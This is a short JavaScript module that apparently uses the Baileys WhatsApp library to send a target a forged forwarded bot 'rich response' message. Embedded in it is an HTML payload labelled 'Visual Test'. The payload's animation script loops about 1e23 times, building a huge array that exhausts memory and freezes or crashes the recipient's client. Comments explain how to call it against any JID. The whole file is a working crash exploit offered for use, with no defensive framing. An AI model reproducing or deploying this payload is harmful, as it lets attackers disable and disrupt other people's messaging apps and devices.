async function slof(sock, jid) {
    const slots = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            __typename: "GenAIUnifiedResponse",
                            response_id: crypto.randomUUID(),
                            sections: [{
                                __typename: "GenAIUnifiedResponseSection",
                                view_model: {
                                    __typename: "GenAISingleLayoutViewModel",
                                    primitive: {
                                        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                                        trusted_sources: [],
                                        payload: `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#000000">
<title>Visual Test</title>
<style>
*{margin:0;padding:0}
html,body{
  width:100%;
  height:100%;
  overflow:hidden;
  background:#000;
}
canvas{
  position:fixed;
  inset:0;
  width:100%;
  height:100%;
  display:block;
  background:#000;
}
</style>
</head>
<body>
<canvas id="fx"></canvas>
<script>
(()=>{
  const canvas=document.getElementById('fx');
  const ctx=canvas.getContext('2d');
  const N=99999999999999999999999;
  let w=0,h=0,dpr=1;
  const dots=[];

  function resize(){
    dpr=Math.min(window.devicePixelRatio||1,2);
    w=window.innerWidth;
    h=window.innerHeight;
    canvas.width=Math.round(w*dpr);
    canvas.height=Math.round(h*dpr);
    ctx.setTransform(dpr,0,0,dpr,0,0);
  }

  function init(){
    dots.length=0;
    for(let i=0;i<N;i++){
      const a=i*Math.PI*2/N;
      dots.push({
        x:w/2+Math.cos(a)*35,
        y:h/2+Math.sin(a)*35,
        a,
        speed:.012+i*.002,
        hue:i*72,
        trail:[]
      });
    }
  }

  function frame(){
    ctx.clearRect(0,0,w,h);
    const cx=w/2,cy=h/2;

    for(const p of dots){
      p.a+=p.speed;
      p.x=cx+Math.cos(p.a)*Math.min(w,h)*.19;
      p.y=cy+Math.sin(p.a*1.3)*Math.min(w,h)*.19;

      p.trail.push({x:p.x,y:p.y});
      if(p.trail.length>55)p.trail.shift();

      for(let j=1;j<p.trail.length;j++){
        const a=p.trail[j-1],b=p.trail[j];
        ctx.beginPath();
        ctx.moveTo(a.x,a.y);
        ctx.lineTo(b.x,b.y);
        ctx.lineWidth=1+7*j/p.trail.length;
        ctx.strokeStyle=\`hsla(\${p.hue},100%,60%,\${.65*j/p.trail.length})\`;
        ctx.stroke();
      }

      const g=ctx.createRadialGradient(p.x,p.y,0,p.x,p.y,55);
      g.addColorStop(0,'white');
      g.addColorStop(.12,\`hsl(\${p.hue},100%,70%)\`);
      g.addColorStop(1,\`hsla(\${p.hue},100%,50%,0)\`);
      ctx.fillStyle=g;
      ctx.beginPath();
      ctx.arc(p.x,p.y,55,0,Math.PI*2);
      ctx.fill();

      ctx.beginPath();
      ctx.arc(p.x,p.y,5,0,Math.PI*2);
      ctx.fillStyle='#fff';
      ctx.fill();
    }

    requestAnimationFrame(frame);
  }

  // Mulai langsung ketika script dijalankan.
  resize();
  init();
  frame();

  window.addEventListener('resize',()=>{
    resize();
    init();
  });
})();
</script>
</body>
</html>`
                                    }
                                }
                            }]
                        })).toString("base64")
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardOrigin: 4
                    }
                }
            }
        }
    }

    const msg = await generateWAMessageFromContent(jid, slots, {})
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })
}

module.exports = slof
// cara pakai:
// const slof = require('./slof.js')
// await slof(sock, jid)
